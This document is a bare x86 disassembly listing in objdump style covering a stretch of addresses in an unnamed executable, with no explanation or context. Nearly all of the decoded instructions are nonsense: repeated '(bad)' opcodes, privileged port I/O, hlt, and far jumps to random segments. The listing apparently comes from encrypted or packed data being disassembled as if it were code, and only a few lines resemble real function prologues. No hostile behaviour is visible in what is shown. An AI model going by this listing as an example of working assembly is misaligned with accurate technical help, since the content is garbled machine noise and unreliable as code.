  4051ba:	adc    al,0x5d
  4051bc:	int    0xa6
  4051be:	repz cmp esi,eax
  4051c1:	loope  0x4051de
  4051c3:	mov    ch,BYTE PTR ds:0xc29c3ff6
  4051c9:	xor    edi,DWORD PTR fs:[bp+si+0x4f4a]
  4051cf:	push   edi
  4051d0:	xchg   ebp,eax
  4051d1:	sub    BYTE PTR [esi-0x3],0xa7
  4051d5:	jb     0x4051b1
  4051d7:	add    eax,0x349e0cdd
  4051dc:	dec    ebp
  4051dd:	jb     0x405252
  4051df:	xchg   ah,al
  4051e1:	in     al,0x43
  4051e3:	inc    esp
  4051e4:	add    BYTE PTR [ecx-0x78],cl
  4051e7:	ss dec ebp
  4051e9:	jg     0x405237
  4051eb:	stos   DWORD PTR es:[edi],eax
  4051ec:	and    eax,0xf34ef28f
  4051f1:	mov    cl,0x7f
  4051f3:	in     al,0x14
  4051f5:	mov    DWORD PTR [eax],esp
  4051f7:	jl     0x4051da
  4051f9:	mov    eax,0x2a275376
  4051fe:	hlt    
  4051ff:	mov    ds:0x6b7bcef8,al
  405204:	mov    cl,0x3c
  405206:	push   ss
  405207:	into   
  405208:	xlat   BYTE PTR ds:[ebx]
  405209:	(bad)  
  40520b:	ror    DWORD PTR [ebx-0x3b],cl
  40520e:	adc    bh,BYTE PTR [ebp+0x73]
  405211:	mov    ah,0xcf
  405213:	sbb    al,0x6e
  405215:	nop
  405216:	xor    cl,BYTE PTR [esi]
  405218:	out    0x39,eax
  40521a:	hlt    
  40521b:	adc    cl,BYTE PTR [edx+0x6f17263]
  405221:	(bad)  
  405223:	test   edi,edx
  405225:	push   ebx
  405226:	sub    cl,BYTE PTR [ecx-0x5d]
  405229:	call   0x91da8f03
  40522e:	adc    BYTE PTR [ecx+ebp*1-0x39],dl
  405232:	push   ss
  405233:	ds adc edx,0xffffff94
  405237:	cmp    dl,ch
  405239:	jge    0x405215
  40523b:	jl     0x4051cd
  40523d:	ins    BYTE PTR es:[edi],dx
  40523e:	jg     0x40529f
  405240:	sub    eax,DWORD PTR [ecx+edi*2+0x68]
  405244:	dec    edx
  405245:	rcl    DWORD PTR [ebx-0x10],0xd6
  405249:	je     0x4052b8
  40524b:	cs pop es
  40524d:	hlt    
  40524e:	add    ch,BYTE PTR cs:[esi+ecx*1+0x3b17ef99]
  405256:	mov    cl,0x13
  405258:	mov    dl,0x1d
  40525a:	dec    edx
  40525b:	loop   0x405289
  40525d:	lods   al,BYTE PTR ds:[esi]
  40525e:	retf   0xeb7d
  405261:	adc    bl,BYTE PTR [edx-0x32]
  405264:	fdiv   DWORD PTR [ebp+0x5aedd6b]
  40526a:	xor    al,0xea
  40526c:	loopne 0x405202
  40526e:	xor    al,0xba
  405270:	sbb    BYTE PTR [esi+0x20],cl
  405273:	(bad)  
  405274:	mov    edi,0xc41040f1
  405279:	xchg   ebx,ebp
  40527b:	jp     0x4052c5
  40527d:	pusha  
  40527e:	and    DWORD PTR [esi],ebp
  405280:	outs   dx,DWORD PTR ds:[esi]
  405281:	mov    dl,0xb8
  405283:	dec    ebp
  405284:	fdivr  QWORD PTR [eax+ecx*1-0x55c94f00]
  40528b:	call   0xe105b642
  405290:	nop
  405291:	inc    edi
  405292:	ret    0x4eb
  405295:	mov    esp,0xd611f9e1
  40529a:	test   eax,0x4a54e0b4
  40529f:	sti    
  4052a0:	push   ecx
  4052a1:	xor    dh,ch
  4052a3:	and    al,0x83
  4052a5:	stos   DWORD PTR es:[edi],eax
  4052a6:	clc    
  4052a7:	iret   
  4052a8:	pusha  
  4052a9:	jo     0x40531a
  4052ab:	ins    DWORD PTR es:[edi],dx
  4052ac:	xor    DWORD PTR [ecx-0x245ccce8],esi
  4052b2:	push   esi
  4052b3:	clc    
  4052b4:	rcr    BYTE PTR [ebp+0x6e5a73c6],0xd9
  4052bb:	adc    DWORD PTR [eax-0x3ab679e4],0xaf612702
  4052c5:	nop
  4052c6:	retf   
  4052c7:	(bad)  
  4052c8:	fbstp  TBYTE PTR [edx+0x633a975b]
  4052ce:	cmp    DWORD PTR [ebx+edi*1-0x41],ebp
  4052d2:	cmp    eax,0x1743435f
  4052d7:	gs sub edi,edx
  4052da:	retf   0x726e
  4052dd:	add    dh,BYTE PTR [esi-0x6039896a]
  4052e3:	out    dx,al
  4052e4:	xor    DWORD PTR [esi],esi
  4052e6:	in     al,0x34
  4052e8:	xchg   ebx,eax
  4052e9:	popa   
  4052ea:	imul   edi,DWORD PTR [ebx],0xd86daf0f
  4052f0:	adc    eax,DWORD PTR [eax-0x23fdb45d]
  4052f6:	pextrw esp,(bad),0xc5
  4052f8:	mov    ds:0x6cae7f5d,al
  4052fd:	mov    eax,0x2c571772
  405302:	xchg   ebp,eax
  405303:	dec    esp
  405304:	adc    esp,DWORD PTR [ecx-0x15e551cf]
  40530a:	push   ss
  40530b:	sbb    BYTE PTR [esi-0x57],al
  40530e:	push   ebx
  40530f:	pop    ebx
  405310:	aam    0xdc
  405312:	str    WORD PTR ds:[edx]
  405316:	fwait
  405317:	scas   al,BYTE PTR es:[edi]
  405318:	cdq    
  405319:	lock test edx,edi
  40531c:	pushf  
  40531d:	mov    ebp,0x5e11b5d3
  405322:	loope  0x40534c
  405324:	or     edx,DWORD PTR [eax+edx*1+0x61]
  405328:	fiadd  WORD PTR [ebp-0x7487370f]
  40532e:	xchg   edx,eax
  40532f:	cmp    dh,BYTE PTR [esp+eax*2]
  405332:	and    eax,DWORD PTR [edx]
  405334:	cdq    
  405335:	sub    eax,0x63fdac2d
  40533a:	leave  
  40533b:	sub    DWORD PTR [ebx],esp
  40533d:	dec    ebp
  40533e:	out    dx,al
  40533f:	sbb    al,0xb7
  405342:	adc    esi,ecx
  405344:	jp     0x4053b9
  405346:	leave  
  405347:	stc    
  405348:	jns    0x4052e9
  40534a:	cmp    DWORD PTR [edi*2+0x21b93014],esi
  405351:	int    0x76
  405353:	push   es
  405354:	or     eax,0xaf12c231
  405359:	icebp  
  40535a:	int3   
  40535b:	jl     0x40532d
  40535d:	addr16 into 
  40535f:	and    bh,BYTE PTR [edi+0x599e73eb]
  405365:	xchg   BYTE PTR [ebx+0x19],bh
  405368:	dec    esi
  405369:	push   DWORD PTR [esi+ebp*1+0x7e40df0d]
  405370:	push   0x2b5b2f73
  405375:	or     BYTE PTR [ecx+edi*1+0x27],bl
  405379:	cmp    BYTE PTR [ebx],bl
  40537b:	lods   eax,DWORD PTR ds:[esi]
  40537c:	mov    al,ds:0xdca610b6
  405381:	adc    al,0x32
  405383:	xchg   ebx,eax
  405384:	dec    esi
  405385:	jne    0x405398
  405387:	or     al,BYTE PTR [ecx]
  405389:	cwde   
  40538a:	inc    edi
  40538b:	cwde   
  40538c:	repz jmp 0xc10d04a7
  405392:	lahf   
  405393:	stos   BYTE PTR es:[edi],al
  405394:	xor    al,0x43
  405396:	push   esp
  405397:	int    0xff
  405399:	fdiv   st(2),st
  40539b:	sar    BYTE PTR [ebx+eiz*1],cl
  40539e:	xor    BYTE PTR [esi],al
  4053a0:	pop    eax
  4053a1:	mov    WORD PTR [eax-0x378238a6],cs
  4053a7:	es std 
  4053a9:	lods   eax,DWORD PTR ds:[esi]
  4053aa:	pop    es
  4053ab:	into   
  4053ac:	jno    0x405368
  4053ae:	je     0x405387
  4053b0:	mov    al,0xf3
  4053b2:	in     eax,0x43
  4053b4:	scas   al,BYTE PTR es:[edi]
  4053b5:	imul   eax,DWORD PTR [ebx],0x6dd1014b
  4053bb:	rcr    bl,0xcb
  4053be:	mov    eax,ds:0x3c760da
  4053c3:	das    
  4053c4:	jl     0x405436
  4053c6:	int    0x88
  4053c8:	adc    eax,DWORD PTR [ebp+0x6daeba7d]
  4053ce:	sti    
  4053cf:	and    al,ch
  4053d1:	int3   
  4053d2:	dec    ecx
  4053d3:	addr16 add eax,0x93948877
  4053d9:	dec    eax
  4053da:	retf   0xdd2
  4053dd:	xchg   esp,eax
  4053de:	ret    0x42e2
  4053e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053e2:	inc    edi
  4053e3:	mov    edi,0xda29b55c
  4053e8:	or     DWORD PTR [edx],ebp
  4053ea:	add    BYTE PTR [eax+0x64427d81],dl
  4053f0:	jle    0x405427
  4053f2:	mov    DWORD PTR [ebx],edi
  4053f4:	les    ecx,FWORD PTR [edi-0x74]
  4053f7:	shl    DWORD PTR [edi-0x5b],1
  4053fa:	mov    edx,0x8485ceff
  4053ff:	loopne 0x405381
  405401:	sub    edi,ebp
  405403:	ds xchg edx,edi
  405406:	mov    al,BYTE PTR [edi-0x5d]
  405409:	bound  edx,QWORD PTR [esi+0x44379d8e]
  40540f:	cmp    DWORD PTR [ebp-0x67],0xd8bd9996
  405416:	cs pop ecx
  405418:	jp     0x4053f8
  40541a:	cdq    
  40541b:	push   esp
  40541c:	neg    BYTE PTR [edx]
  40541e:	(bad)
  405421:	or     DWORD PTR [ebx+0x7434b017],0xffffff97
  405428:	aaa    
  405429:	stos   BYTE PTR es:[edi],al
  40542a:	aam    0xdb
  40542c:	pop    esi
  40542d:	out    dx,al
  40542e:	push   0xcdeea41a
  405433:	repnz pop eax
  405435:	int    0x28
  405437:	fwait
  405438:	pop    esi
  405439:	in     al,0x9b
  40543b:	mov    eax,ds:0x76f5921d
  405440:	sub    eax,0xa188b1e6
  405445:	mov    ch,0xb
  405447:	iret   
  405448:	add    eax,DWORD PTR [eax-0x9531e68]
  40544e:	imul   esp,DWORD PTR [ebx+eax*2+0x14fee93b],0x54
  405456:	pop    eax
  405457:	push   edx
  405458:	cs push esp
  40545a:	dec    ecx
  40545b:	push   edi
  40545c:	pop    ss
  40545d:	adc    bl,BYTE PTR [edx+0x69b18979]
  405463:	popf   
  405464:	mov    ecx,0xa31b12a3
  405469:	cdq    
  40546a:	scas   eax,DWORD PTR es:[edi]
  40546b:	adc    BYTE PTR [esi-0x13],dl
  40546e:	inc    ebp
  40546f:	adc    BYTE PTR [esi+0x22],bl
  405472:	mov    al,0x66
  405474:	lods   eax,DWORD PTR ds:[esi]
  405475:	cmp    dl,dh
  405477:	push   edx
  405478:	mov    BYTE PTR [edx],0x58
  40547b:	iret   
  40547c:	out    0xcc,eax
  40547e:	sbb    eax,0xc2c95e7a
  405483:	or     al,0x0
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e804
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e76b,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	into   
  4054a9:	mov    BYTE PTR [ecx+0x7037109c],0x70
  4054b0:	stos   BYTE PTR es:[edi],al
  4054b1:	jle    0x405523
  4054b3:	jo     0x405453
  4054b5:	inc    edx
  4054b6:	pop    ecx
  4054b7:	or     BYTE PTR [ecx-0x4c8f9936],al
  4054bd:	inc    ebx
  4054be:	in     al,dx
  4054bf:	je     0x4054b9
  4054c1:	or     BYTE PTR [ebx+0x5cbc8aff],0x1a
  4054c8:	in     eax,0x89
  4054ca:	arpl   WORD PTR [ebp+0x37],dx
  4054cd:	(bad)  
  4054ce:	test   eax,0x4e5f6fb4
  4054d3:	fucom  st(2)
  4054d5:	dec    esp
  4054d6:	out    dx,eax
  4054d7:	inc    ebx
  4054d8:	test   BYTE PTR ds:0x61b9b746,bh
  4054de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054df:	jne    0x4054ef
  4054e1:	jno    0x482a58ed
  4054e7:	lea    edi,[ecx]
  4054e9:	add    eax,DWORD PTR [eax]
  4054eb:	fstp   DWORD PTR [esi+0x7ef60006]
  4054f1:	or     BYTE PTR [eax+eiz*8+0x51],dh
  4054f5:	push   ecx
  4054f6:	add    DWORD PTR [edi-0x4a],ecx
  4054f9:	data16 jne 0x4054c4
  4054fc:	add    eax,0x51c3e5d0
  405501:	mov    ecx,0xe416270d
  405506:	std    
  405507:	(bad)  
  405508:	mov    edx,0x23133c35
  40550d:	jg     0x4054b4
  40550f:	clc    
  405510:	aaa    
  405511:	ins    BYTE PTR es:[edi],dx
  405512:	pop    edx
  405513:	sub    ecx,edi
  405515:	cmp    al,0x5f
  405517:	rcr    DWORD PTR [eax],0xbf
  40551a:	push   ebp
  40551b:	inc    ecx
  40551c:	inc    ebp
  40551d:	cmp    DWORD PTR [eax-0x3e],eax
  405520:	fcmovb st,st(0)
  405522:	and    DWORD PTR [eax+esi*4-0x6594a989],edi
  405529:	mov    ah,0xf2
  40552b:	push   0x3968321f
  405530:	das    
  405531:	pop    ds
  405532:	pop    ds
  405533:	jne    0x40550c
  405535:	cs in  al,0xbf
  405538:	adc    ah,bl
  40553a:	retf   
  40553b:	aas    
  40553c:	sbb    eax,0xb780e689
  405541:	ret    
  405542:	leave  
  405543:	nop
  405544:	mov    al,ds:0xf08430f8
  405549:	dec    esp
  40554a:	scas   eax,DWORD PTR es:[edi]
  40554b:	mov    ebp,0xe9cdde70
  405550:	(bad)  
  405551:	out    0x15,eax
  405553:	cmp    DWORD PTR [eax],ebp
  405555:	aaa    
  405556:	sbb    DWORD PTR [edx],esi
  405558:	pop    ecx
  405559:	icebp  
  40555a:	imul   ecx,DWORD PTR [eax+0x2f3ed18a],0x64ad4ce4
  405564:	fiadd  WORD PTR [esi+0x6f2d761e]
  40556a:	js     0x40558f
  40556c:	jb     0x405514
  40556e:	out    0xe7,eax
  405570:	(bad)  
  405571:	(bad)
  405575:	stc    
  405576:	aam    0x3d
  405578:	xor    ebx,edi
  40557a:	pop    esi
  40557b:	or     eax,0xccda37c8
  405580:	(bad)  
  405581:	dec    esp
  405582:	test   eax,0x186d460
  405587:	sbb    BYTE PTR [eax-0x465663dc],ch
  40558d:	sti    
  40558e:	adc    al,0x65
  405590:	pop    ecx
  405591:	inc    ebx
  405592:	js     0x405568
  405594:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405595:	ss dec edx
  405597:	iret   
  405598:	(bad)  
  405599:	outs   dx,BYTE PTR ds:[esi]
  40559a:	xor    edi,ecx
  40559c:	gs and eax,0xe0a7caa
  4055a2:	lea    ebp,[edi-0x3f4088a]
  4055a8:	cmp    esp,DWORD PTR [edi+0x49a5c786]
  4055ae:	(bad)  
  4055af:	sub    al,0x59
  4055b1:	adc    DWORD PTR [edx+0x36630741],eax
  4055b7:	inc    esi
  4055b8:	sbb    DWORD PTR [esi+0x6f34ac],esi
  4055be:	or     eax,0x1a383d30
  4055c3:	and    al,0x48
  4055c5:	ror    BYTE PTR [esp+esi*8-0x5f],cl
  4055c9:	arpl   WORD PTR [ebp+0x22],dx
  4055cc:	add    dl,0x76
  4055cf:	mov    bl,dh
  4055d1:	xor    al,0x75
  4055d3:	adc    BYTE PTR [ecx-0x6cee21e5],bh
  4055d9:	pop    ebp
  4055da:	cbw    
  4055dc:	das    
  4055dd:	stos   DWORD PTR es:[edi],eax
  4055de:	int3   
  4055df:	fstp   QWORD PTR [ebx-0x2d6d2d83]
  4055e5:	mov    esi,0x967a0462
  4055ea:	mov    ecx,0x9867c524
  4055ef:	mov    edi,0x5c712792
  4055f4:	shl    eax,cl
  4055f6:	call   0x4d50:0xa032d4a8
  4055fd:	push   cs
  4055fe:	jns    0x4055a8
  405600:	inc    eax
  405601:	addr16 pop eax
  405603:	push   ebx
  405604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405605:	cmp    al,0x85
  405607:	leave  
  405608:	xor    DWORD PTR [ebx+0x4c54776b],ecx
  40560e:	cmp    eax,0xea4896d9
  405613:	inc    edi
  405614:	jmp    0xf9be2cd3
  405619:	xlat   BYTE PTR ds:[ebx]
  40561a:	in     al,0xc9
  40561c:	repz xor DWORD PTR [esi],ebx
  40561f:	addr16 mov ds:0x5234,al
  405623:	xchg   ecx,eax
  405624:	add    eax,0xd04d014e
  405629:	push   0x9800ef0e
  40562e:	lds    edx,FWORD PTR [ebp-0x1c]
  405631:	mov    eax,0x199b2a01
  405636:	or     al,0x52
  405638:	std    
  405639:	pop    esp
  40563a:	add    eax,0x4b52be9f
  40563f:	pop    esi
  405640:	cld    
  405641:	fsub   QWORD PTR [edx-0x3f1055c5]
  405647:	xchg   edi,eax
  405648:	je     0x4055df
  40564a:	ds das 
  40564c:	push   es
  40564d:	pop    esp
  40564e:	jb     0x4056c8
  405650:	push   ds
  405651:	sbb    al,BYTE PTR [ebp-0x619b2789]
  405657:	mov    DWORD PTR [ebx-0x1b4a6616],esi
  40565d:	push   0x1d
  40565f:	mov    eax,0xbc30f8e6
  405664:	inc    ebp
  405665:	ror    eax,0x3e
  405668:	clc    
  405669:	mov    ch,0xea
  40566b:	stos   BYTE PTR es:[edi],al
  40566c:	dec    ebx
  40566d:	cmp    ecx,DWORD PTR [ecx+0x631aeee8]
  405673:	and    al,0x42
  405675:	dec    esi
  405676:	test   eax,0x8f656519
  40567b:	fild   QWORD PTR [edi]
  40567d:	cmp    DWORD PTR [edi-0x7618a72a],esi
  405683:	inc    ebx
  405684:	mov    ecx,0x9bf937d1
  405689:	add    dh,BYTE PTR [eax+0x6a]
  40568c:	cld    
  40568d:	add    bl,bl
  40568f:	pop    esi
  405690:	add    dh,dh
  405692:	scas   eax,DWORD PTR es:[edi]
  405693:	dec    esp
  405694:	mov    eax,ds:0xc27a3d14
  405699:	ins    BYTE PTR es:[edi],dx
  40569a:	lock stc 
  40569c:	mov    ch,0x1c
  40569e:	retf   
  40569f:	pop    ss
  4056a0:	loop   0x40569d
  4056a2:	pop    esi
  4056a3:	sti    
  4056a4:	cmp    bl,BYTE PTR [ebx+ebp*8]
  4056a7:	cmp    ch,BYTE PTR [ebx+0x72]
  4056aa:	addr16 and al,0x4
  4056ad:	icebp  
  4056ae:	aas    
  4056af:	std    
  4056b0:	mov    ecx,fs
  4056b2:	test   DWORD PTR [eax],ecx
  4056b4:	mov    cl,0xa0
  4056b6:	mov    eax,ds:0x9c5d084c
  4056bb:	rcr    DWORD PTR ds:0xac001571,1
  4056c1:	and    BYTE PTR [ecx+0x64188a1f],0x49
  4056c8:	fimul  WORD PTR [ecx-0x2a5599d2]
  4056ce:	lock dec esp
  4056d0:	call   0x8188:0xdd489b85
  4056d7:	pop    eax
  4056d8:	lods   eax,DWORD PTR ds:[esi]
  4056d9:	test   BYTE PTR [ebx+0x78a20875],cl
  4056df:	jb     0x40575b
  4056e1:	or     edx,eax
  4056e3:	cmp    BYTE PTR [ebp+edi*4-0x7ec30749],al
  4056ea:	and    al,0xaa
  4056ec:	int    0x32
  4056ee:	neg    BYTE PTR [edi-0x6079be9f]
  4056f4:	mov    eax,0xeb85c4bb
  4056f9:	mov    al,0x8
  4056fb:	ja     0x4056eb
  4056fd:	jecxz  0x40569e
  4056ff:	mov    esp,0x46db8f4a
  405704:	das    
  405705:	inc    esi
  405706:	adc    DWORD PTR [ebx-0x3804338a],esi
  40570c:	jmp    0x9963:0x12835b62
  405713:	(bad)  
  405714:	sbb    eax,0x454abb6b
  405719:	int    0x49
  40571b:	mov    edi,fs
  40571d:	xchg   ebp,eax
  40571e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40571f:	lods   al,BYTE PTR ds:[esi]
  405720:	inc    ebp
  405721:	dec    eax
  405722:	call   0xfd4628ca
  405727:	ins    DWORD PTR es:[edi],dx
  405728:	sub    eax,0xebd3bc74
  40572d:	sbb    DWORD PTR [ecx-0x33],0x50fad8f6
  405734:	mov    ecx,0x108444e8
  405739:	fldz   
  40573b:	fs jns 0x405746
  40573e:	mov    ebx,0x73a4c43b
  405743:	pop    ebx
  405744:	mov    dl,0x4f
  405746:	repz pop edx
  405748:	push   ds
  405749:	shl    BYTE PTR [ecx+0x4],cl
  40574c:	pop    ebx
  40574d:	aaa    
  40574e:	in     eax,dx
  40574f:	leave  
  405750:	and    DWORD PTR [esp-0x3ea19f65],edx
  405757:	rol    eax,cl
  405759:	pusha  
  40575a:	aas    
  40575b:	xor    BYTE PTR [eax-0x765c1ef6],0x48
  405762:	imul   ecx,DWORD PTR [ebx+0x7168860c],0xf513575
  40576c:	mov    bh,0x5
  40576e:	push   es
  40576f:	inc    BYTE PTR [edx+0x0]
  405772:	and    eax,DWORD PTR ds:0x42fdfa
  405778:	mov    ds:0x42fe06,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx+0x6df991be],eax
  405790:	(bad)  
  405791:	fisttp QWORD PTR [edx+0x35]
  405794:	jo     0x405806
  405796:	stos   BYTE PTR es:[edi],al
  405797:	jle    0x405809
  405799:	jo     0x405800
  40579b:	test   DWORD PTR [eax],esi
  40579d:	push   ebp
  40579e:	cmp    BYTE PTR [edx],ch
  4057a0:	je     0x4057aa
  4057a2:	mov    ds:0x248d12e8,al
  4057a7:	je     0x4057a7
  4057a9:	fsub   QWORD PTR [esi]
  4057ab:	cwde   
  4057ac:	and    al,0x12
  4057ae:	inc    esi
  4057af:	popa   
  4057b0:	bound  edi,QWORD PTR [esi+0x43409a11]
  4057b6:	or     ebp,edx
  4057b8:	mov    ebx,0xc2f636da
  4057bd:	jl     0x4057d2
  4057bf:	lock out 0x9,al
  4057c2:	push   0x7dc24a66
  4057c7:	jmp    0x48a0:0x35421d1f
  4057ce:	stos   DWORD PTR es:[edi],eax
  4057cf:	std    
  4057d0:	fist   WORD PTR [edi+0x7f77fc6a]
  4057d6:	addr16 add ah,dl
  4057d9:	push   eax
  4057da:	xchg   esi,eax
  4057db:	test   al,0x57
  4057dd:	in     al,0x33
  4057df:	aam    0xf
  4057e1:	dec    edx
  4057e2:	mov    WORD PTR [ecx-0x12ae74a3],?
  4057e8:	mov    edi,0x2db798da
  4057ed:	adc    DWORD PTR [esi],esp
  4057ef:	mov    eax,ds:0xf064607b
  4057f4:	cli    
  4057f5:	xor    eax,0xeb5966c6
  4057fa:	nop
  4057fb:	cmp    cl,BYTE PTR ds:0x150e3b84
  405801:	xchg   esp,eax
  405802:	outs   dx,BYTE PTR ds:[esi]
  405803:	leave  
  405804:	xlat   BYTE PTR ds:[ebx]
  405805:	loope  0x40585a
  405807:	and    al,0x9c
  405809:	jmp    0xbbc5:0x14c59263
  405810:	adc    al,0x91
  405812:	adc    dl,dh
  405814:	push   ebp
  405815:	mov    ds:0xb580d5d3,eax
  40581a:	jge    0x405838
  40581c:	or     esi,ebx
  40581e:	jecxz  0x40582e
  405820:	shl    BYTE PTR [ebx],1
  405822:	or     eax,0xf2788667
  405827:	add    eax,esp
  405829:	jae    0x405834
  40582b:	and    al,0xcc
  40582d:	enter  0x5176,0xa9
  405831:	xchg   DWORD PTR [edx-0x9],esp
  405834:	sbb    al,0xee
  405836:	jle    0x4057fc
  405838:	xchg   DWORD PTR [ebx+0x7a78d230],ebx
  40583e:	ins    DWORD PTR es:[edi],dx
  40583f:	sbb    dl,BYTE PTR [esi+0x3d6d111]
  405845:	mov    ds:0x6201b944,al
  40584a:	clc    
  40584b:	mov    es,ebp
  40584d:	into   
  40584e:	addr16 inc ebx
  405850:	stos   DWORD PTR es:[edi],eax
  405851:	js     0x4057d8
  405853:	enter  0xaeb7,0x5b
  405857:	and    DWORD PTR [esi],ebp
  405859:	aam    0x8c
  40585b:	xor    esi,0xffffffb9
  40585e:	pushf  
  40585f:	inc    ecx
  405860:	rcr    BYTE PTR [ebx],cl
  405862:	enter  0x39fd,0x7
  405866:	in     al,dx
  405867:	push   0xffffffb7
  405869:	retf   
  40586a:	mov    ch,0x41
  40586c:	out    0x4,al
  40586e:	dec    esi
  40586f:	or     al,0x10
  405871:	cmp    dl,BYTE PTR ds:0x8ba15e43
  405877:	and    BYTE PTR [edi-0x79],ch
  40587a:	(bad)  
  40587b:	lock arpl WORD PTR [ecx+0x645557d2],si
  405882:	(bad)  [edx]
  405884:	mov    dh,ch
  405886:	mov    ch,0x68
  405888:	test   esi,edx
  40588a:	cmp    eax,0x48d55083
  40588f:	pop    eax
  405890:	jo     0x405906
  405892:	and    ch,BYTE PTR [esi+esi*1+0x5aed6f3b]
  405899:	or     DWORD PTR [edi+0x17fb884c],0xa79c5585
  4058a3:	je     0x40591b
  4058a5:	jl     0x405853
  4058a7:	gs push ss
  4058a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058aa:	ret    0x6e1d
  4058ad:	jl     0x405850
  4058af:	dec    edi
  4058b0:	dec    ecx
  4058b1:	cli    
  4058b2:	sub    ecx,DWORD PTR [eax-0x11dcbcd5]
  4058b8:	cmp    ebx,esi
  4058ba:	fimul  DWORD PTR [ebp+eiz*1-0x1b]
  4058be:	scas   eax,DWORD PTR es:[edi]
  4058bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058c0:	or     ecx,DWORD PTR [ecx-0x16beebd4]
  4058c6:	iret   
  4058c7:	scas   eax,DWORD PTR es:[edi]
  4058c8:	(bad)
  4058cb:	popa   
  4058cc:	mov    bh,0x55
  4058ce:	cdq    
  4058cf:	push   edi
  4058d0:	mov    esp,0xe362485c
  4058d5:	imul   edx,DWORD PTR [eax],0xffffffb1
  4058d8:	add    eax,0x3f15d8c5
  4058dd:	out    0xd8,al
  4058df:	nop
  4058e0:	mov    esp,0xbdc086a3
  4058e5:	jns    0x405898
  4058e7:	fcomp  DWORD PTR [edi+0x43]
  4058ea:	pop    esp
  4058eb:	and    ch,bh
  4058ed:	loope  0x40593f
  4058ef:	mov    ds:0xfeb7f595,al
  4058f4:	xchg   ebx,eax
  4058f5:	mov    cl,0x63
  4058f7:	scas   al,BYTE PTR es:[edi]
  4058f8:	xchg   BYTE PTR [edi+0x585e8c95],dl
  4058fe:	jo     0x4058c8
  405900:	outs   dx,DWORD PTR ds:[esi]
  405901:	into   
  405902:	rol    BYTE PTR [eax-0x18570a28],cl
  405908:	mov    dh,0x7c
  40590a:	mov    dh,ch
  40590c:	xchg   edi,eax
  40590d:	test   ah,al
  40590f:	cwde   
  405910:	or     esi,DWORD PTR [ecx-0x72647d8b]
  405916:	mov    cl,0x4c
  405918:	imul   ebp,DWORD PTR [esi-0xa],0x72167d62
  40591f:	adc    al,BYTE PTR [edi-0x1bc99a2c]
  405925:	xor    eax,DWORD PTR [esp+edx*8-0x3377b53]
  40592c:	cli    
  40592d:	xlat   BYTE PTR ds:[ebx]
  40592e:	mov    ebp,0x910edae9
  405933:	pop    ss
  405934:	(bad)  
  405935:	mov    dh,0x65
  405937:	ins    DWORD PTR es:[edi],dx
  405938:	add    cl,BYTE PTR ds:0xe2de017c
  40593e:	ret    
  40593f:	repz sbb ebx,DWORD PTR [eax+0x660b24f7]
  405946:	clc    
  405947:	inc    esp
  405948:	aad    0x14
  40594a:	fisubr DWORD PTR [ecx]
  40594c:	aas    
  40594d:	sti    
  40594e:	cmp    ah,BYTE PTR [edx+ebp*4-0x4ba89f95]
  405955:	call   0x3406:0xed503704
  40595c:	push   ss
  40595d:	xor    BYTE PTR [ebp+0x1e],cl
  405960:	and    ecx,ebp
  405962:	jbe    0x405941
  405964:	retf   
  405965:	dec    eax
  405966:	sbb    eax,DWORD PTR [edi]
  405968:	mov    WORD PTR [esi+0x6c23b7e3],ss
  40596e:	inc    esp
  40596f:	dec    ecx
  405970:	imul   esi,DWORD PTR [ebx-0xd],0xffffffb3
  405974:	stos   BYTE PTR es:[edi],al
  405975:	jno    0x4059b0
  405977:	mov    DWORD PTR [ebp-0x58a8c467],esi
  40597d:	or     ebx,edx
  40597f:	cmp    edi,DWORD PTR [eax-0x1]
  405982:	(bad)  
  405983:	lods   eax,DWORD PTR ds:[esi]
  405984:	int    0x4f
  405986:	popf   
  405987:	dec    eax
  405988:	ja     0x405a02
  40598a:	mov    bh,0x86
  40598c:	jno    0x405983
  40598e:	xchg   DWORD PTR [edx-0x4cc63974],esi
  405994:	sbb    DWORD PTR [edi-0x2a0e0a9f],esi
  40599a:	pop    edi
  40599b:	push   ss
  40599c:	and    BYTE PTR [ebx],bl
  40599e:	jle    0x4059ab
  4059a0:	int3   
  4059a1:	xlat   BYTE PTR ds:[ebx]
  4059a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059a3:	fs jmp 0x37e0:0x82c422b7
  4059ab:	inc    ebx
  4059ac:	pop    ecx
  4059ad:	xchg   esp,eax
  4059ae:	bound  ebx,QWORD PTR [eax+0x2a76a0d8]
  4059b4:	stos   BYTE PTR es:[edi],al
  4059b5:	push   ecx
  4059b6:	jmp    0x405964
  4059b8:	cmp    al,0xa
  4059ba:	mov    edx,0x2a59b33e
  4059bf:	retf   0x1b08
  4059c2:	les    ecx,FWORD PTR [ebp+0x18ee4432]
  4059c8:	push   edi
  4059c9:	into   
  4059ca:	mov    al,ds:0xcd348d99
  4059cf:	cmp    eax,0x1a74cd7b
  4059d4:	and    bh,dh
  4059d6:	or     al,0x78
  4059d8:	fnstenv [ecx]
  4059da:	push   esi
  4059db:	sbb    BYTE PTR [ebx+0x35],al
  4059de:	push   ds
  4059df:	scas   eax,DWORD PTR es:[edi]
  4059e0:	test   al,0x4
  4059e2:	pop    ds
  4059e3:	imul   eax,DWORD PTR [esi],0xc3a868c1
  4059e9:	sub    bl,ch
  4059eb:	arpl   bp,cx
  4059ed:	sub    al,0x54
  4059ef:	call   0x727f9a4b
  4059f4:	sti    
  4059f5:	(bad)  
  4059f6:	push   ecx
  4059f7:	sub    BYTE PTR [ecx],0x5
  4059fa:	jl     0x405985
  4059fc:	push   esp
  4059fd:	dec    ecx
